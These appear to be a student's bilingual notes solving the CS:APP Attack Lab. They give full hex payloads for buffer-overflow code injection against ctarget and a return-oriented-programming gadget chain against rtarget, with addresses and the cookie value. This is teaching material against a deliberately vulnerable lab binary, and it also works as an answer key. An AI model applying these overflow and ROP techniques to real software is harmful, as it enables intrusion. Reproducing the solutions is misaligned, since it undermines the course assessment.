# Files

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.

# steps

1. 写 exploit.s，包含想要插入的 asm code 
   
    eg：pushq $0xabcdef  # Push value onto stack

2. 利用 gcc及objdump 生成 exploit.txt ， 含 bin code

    $ gcc -c exploit.s
    $ objdump -d exploit.o > exploit题号.txt

    eg：exploit.txt 中
    
    0: 68 ef cd ab 00 pushq $0xabcdef

3. 修改exploit.txt，st 满足 HEX2RAW 的输入格式
   eg：48 c7 c1 f0 11 40 00 /* mov $0x40011f0,%rcx */
   HEX2RAW可以C-style block comments （ */ 前后有空格）

4. 使用HEX2RAW，可多种方式将bin code转换为输入字符串
   + pass the string through HEX2RAW.
     $ cat exploit.txt | ./hex2raw | ./ctarget
   + store the raw string in a file and use I/O redirection:
         $ ./hex2raw < exploit.txt > exploit-raw.txt
         $ ./ctarget < exploit-raw.txt
     	can also in GDB:
         (gdb) run < exploit-raw.txt
   + store the raw string in a file and provide the file name as a command-line argument:
     $ ./ctarget -i exploit-raw.txt
     can clso in GDB.
   
5. 调用target 并 输入字符串 （要加 -q 

     command line arguments for CTARGET and RTARGET :
     -h: Print list of possible command line arguments
     -q: Don’t send results to the grading server
     -i FILE: Supply input from a file, rather than from standard input  

6. 注意

     + transfers of control：

       + how: not use jmp or call in exploit code. 因 destination addr for these instructions are difficult to formulate. 应当 用 ret, even when you are not returning from a call  

       + return: 地址为 8byte， 多余位要置0

     + 表示数字，byte ordering 

     + 2进制指令，不需要对齐（不要在两条指令间加东西）

     + 2进制 not contain 0x0a (ASCII ‘\n’). 会导致 Gets() terminate the string

     + asm中，立即数要加 $ 

       (ctarget 2 中，mov 没加，理解为内存寻址，导致seg fault)

# Code Injection Attacks  

+ ctarget中：test 调用 getbuf，getbuf 调用 Gets

+ 利用 getbuf 发生 buffer overflow，在stack中插入目标地址（及 exploit code），getbuf 的 ret will transfer control to 目标地址

+ gdb查看：
  + getbuf 分配 stack size $0x28 （可存40个bytes
  + 分配后，rsp = 0x5561dc78

## 1

execute touch1    

+ touch1 地址：0x4017c0
+ 不需 exploit code，只用重定向 ret的地址
+ 输入40个bytes（随意） + 目标地址对应的字符
+ 关于字节顺序：先输入字符存于stack低地址，小端机数字的尾部位于低地址，因此目标地址要逆序输入

```
 /* dummy */
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30

/* ret addr， change to addr of touch1 */
c0 17 40 00 00 00 00 00 
```

## 2

execute touch2 and passed cookie as integer

+ ret 的地址 改为 exploit code 的地址

  位于 rsp （0x5561dc78）

+ exploit code ： 

  cookie 值 放入寄存器 %rdi，作为 touch2 参数

  执行touch2（0x4017ec）
  
  ``` 
  /* 0x5561dc78: exploit code */ 
  48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */  
  68 ec 17 40 00   /* pushq  $0x4017ec  (addr touch2) */ 
  c3  /* retq  */   
  
  /* dummy */ 
  30 30 30 30 30 30 30 30
  30 30 30 30 30 30 30 30
  30 30 30 30 30 30 30 30
  30 30 30
  
  /* overwrite ret addr */ 
  78 dc 61 55 00 00 00 00  /* addr of exploit code */ 
  ```
  

## 3

execute touch3 and passed cookie as string  

+ ret 的地址 改为 exploit code 的地址

  位于 rsp （0x5561dc78）

+ cookie 字符串 放入内存 (stack)

  字符串不用逆序，排列与大小端无关

+ exploit code ： 

  字符串 内存地址 作为 touch3 参数

  执行touch3（0x4018fa）

```
/* 0x5561dc78: exploit code */
48 c7 c7 a8 dc 61 55 /* mov    $5561dca8(addr of str), %rdi */  
68 fa 18 40 00      	/*  pushq  $0x4018fa (addr of touch3) */ 
c3                      	/* retq  */ 

/* dummy */ 
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30

/* overwrite ret addr */ 
78 dc 61 55 00 00 00 00 /* rsp, the addr of exploit code */ 

/* 0x5561dca8: string */
35 39 62 39 39 37 66 61 00
```

+ 注意：

  1. string 结尾加0

  2. touch3调用的函数 使用push, overwrite 插入的code。

     一开始，string作为输入，插入getbuf 的 return addr 的低处，但是尝试了几个都被 overwrite了。

     然后尝试用指令mov string 到低地址，也失败了。

     最终把string作为输入插入return addr 的高处，成功。

  3. mov 64位数，需要两次movq，因为movq只传送32位，其余位改为0

# Return-Oriented Programm  

+ identify useful gadgets in the gadget farm （instructions 的部分 followed by ret）
  use these to perform attacks 

+ Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of
  rtarget. Do not attempt to construct gadgets from other portions of the program code.  

1. disas 获取 farm 的位置：0x401994 - 0x401ab7

2. 获取farm在内存中存储的字节：[farm.txt](./farm.txt)

3. 确定需要的指令，由于立即数难找到，需要存到stack，并使用register

4. 在farm.txt中找以c3结尾的所需要的gadget

   （某类指令有相同格式，如movq都以48 89开头）

5. 输入可以gadget和data交叉，（利用pop的gadget使得返回地址跳过data



## 1

execute touch2 and passed cookie as integer

+ 把cookie存在stack中
+ ret to gadget1，pop出cookie到%rax 
+ ret to gadget2，movq %rax 的值到 %rdi，作为touch2的参数
+ ret to touch2

``` 
/* 0x5561dc78:dummy */ 
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30

/* 	gadget 1 at 0x4019cc 
	pop %rax
	nop
	ret	*/
cc 19 40 00 00 00 00 00

/* touch2's para: cookie number */
fa 97 b9 59 00 00 00 00  

/*  gadget 2 at 0x4019a2
	movq %rax, %rdi
	ret	*/
a2 19 40 00 00 00 00 00
	
/* touch2's addr */
ec 17 40 00 00 00 00 00 
```
